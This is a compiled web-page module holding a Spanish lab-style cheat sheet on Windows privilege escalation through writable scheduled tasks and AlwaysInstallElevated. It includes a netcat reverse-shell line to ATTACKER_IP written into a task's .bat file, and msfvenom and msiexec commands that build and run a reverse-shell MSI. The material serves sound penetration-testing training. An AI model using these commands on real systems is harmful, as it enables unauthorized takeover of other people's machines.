import{_ as s,o as a,c as i,ai as t}from"./chunks/framework.DIUhWiTt.js";const u=JSON.parse('{"title":"Other Quick Wins","description":"","frontmatter":{},"headers":[],"relativePath":"notas/cheatsheet/3.escalada_de_privilegios/2.windows/otros/3.other-quick-wins.md","filePath":"notas/cheatsheet/3.escalada_de_privilegios/2.windows/otros/3.other-quick-wins.md"}'),l={name:"notas/cheatsheet/3.escalada_de_privilegios/2.windows/otros/3.other-quick-wins.md"};function n(o,e,r,d,c,h){return a(),i("div",null,[...e[0]||(e[0]=[t(`<h1 id="other-quick-wins" tabindex="-1">Other Quick Wins <a class="header-anchor" href="#other-quick-wins" aria-label="Permalink to “Other Quick Wins”">​</a></h1><h3 id="scheduled-tasks" tabindex="-1">Scheduled Tasks <a class="header-anchor" href="#scheduled-tasks" aria-label="Permalink to “Scheduled Tasks”">​</a></h3><p>Al examinar las tareas programadas en el sistema de destino, es posible que vea una tarea programada que perdió su binario o que está usando un binario que puede modificar.</p><p>Las tareas programadas se pueden enumerar desde la línea de comando usando el <code>schtasks</code> comando sin ninguna opción. Para recuperar información detallada sobre cualquiera de los servicios, puede utilizar un comando como el siguiente:</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>C:\\&gt; schtasks /query /tn vulntask /fo list /v</span></span></code></pre></div><p>Obtendrá mucha información sobre la tarea, pero lo que nos importa es el parámetro &quot;Task To Run&quot;, que indica qué ejecuta la tarea programada, y el parámetro &quot;Ejecutar como usuario&quot;, que muestra el usuario que se utilizará. para ejecutar la tarea.</p><p>Si nuestro usuario actual puede modificar o sobrescribir el ejecutable &quot;Tarea a ejecutar&quot;, podemos controlar lo que ejecuta el usuario taskusr1, lo que resulta en una simple escalada de privilegios. Para verificar los permisos del archivo en el ejecutable, usamos <code>icacls</code>:</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>C:\\&gt; icacls c:\\tasks\\schtask.bat </span></span>
<span class="line"><span>c:\\tasks\\schtask.bat NT AUTHORITY\\SYSTEM:(I)(F)</span></span></code></pre></div><p>Como se puede ver en el resultado, el grupo <strong>BUILTIN \\ Users</strong> tiene acceso completo (F) sobre el binario de la tarea. Esto significa que podemos modificar el archivo .bat e insertar cualquier carga útil que queramos. Para su comodidad, <code>nc64.exe</code>puede encontrarlo en <code>C:\\tools</code>. Cambiemos el archivo bat para generar un shell inverso:</p><div class="language-shell-session"><button title="Copy Code" class="copy"></button><span class="lang">shell-session</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>C:\\&gt; echo c:\\tools\\nc64.exe -e cmd.exe ATTACKER_IP 4444 &gt; C:\\tasks\\schtask.bat</span></span></code></pre></div><p>Luego iniciamos un detector en la máquina atacante en el mismo puerto que indicamos en nuestro shell inverso:</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>C:\\&gt; schtasks /run /tn vulntask</span></span></code></pre></div><p>Y recibirá el shell inverso con privilegios taskusr1 como se esperaba:</p><p>Vaya al escritorio taskusr1 para recuperar una bandera. No olvides ingresar la bandera al final de esta tarea.</p><h3 id="always-install-elevated" tabindex="-1">Always Install Elevated <a class="header-anchor" href="#always-install-elevated" aria-label="Permalink to “Always Install Elevated”">​</a></h3><p>Los archivos del instalador de Windows (también conocidos como archivos .msi) se utilizan para instalar aplicaciones en el sistema. Suelen ejecutarse con el nivel de privilegio del usuario que lo inicia. Sin embargo, estos se pueden configurar para ejecutarse con privilegios más altos desde cualquier cuenta de usuario (incluso las que no tienen privilegios). Potencialmente, esto podría permitirnos generar un archivo MSI malicioso que se ejecutaría con privilegios de administrador.</p><p><strong>Nota:</strong> El método AlwaysInstallElevated no funcionará en la máquina de esta sala y se incluye solo como información.</p><p>Este método requiere que se establezcan dos valores de registro. Puede consultarlos desde la línea de comando usando los siguientes comandos.</p><div class="language-powershell"><button title="Copy Code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">C:\\</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">C:\\</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer</span></span></code></pre></div><p>Para poder aprovechar esta vulnerabilidad, se deben configurar ambos. De lo contrario, la explotación no será posible. Si están configurados, puede generar un archivo .msi malicioso usando <code>msfvenom</code>, como se ve a continuación:</p><div class="language-shell-session"><button title="Copy Code" class="copy"></button><span class="lang">shell-session</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span>msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi</span></span></code></pre></div><p>Como se trata de un shell inverso, también debe ejecutar el módulo Metasploit Handler configurado en consecuencia. Una vez que haya transferido el archivo que ha creado, puede ejecutar el instalador con el siguiente comando y recibir el shell inverso:</p><div class="language-shell"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">C:\\</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt; </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">msiexec</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /quiet</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /qn</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /i</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> C:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\W</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">indows</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\T</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">emp</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\\m</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">alicious.msi</span></span></code></pre></div>`,23)])])}const k=s(l,[["render",n]]);export{u as __pageData,k as default};
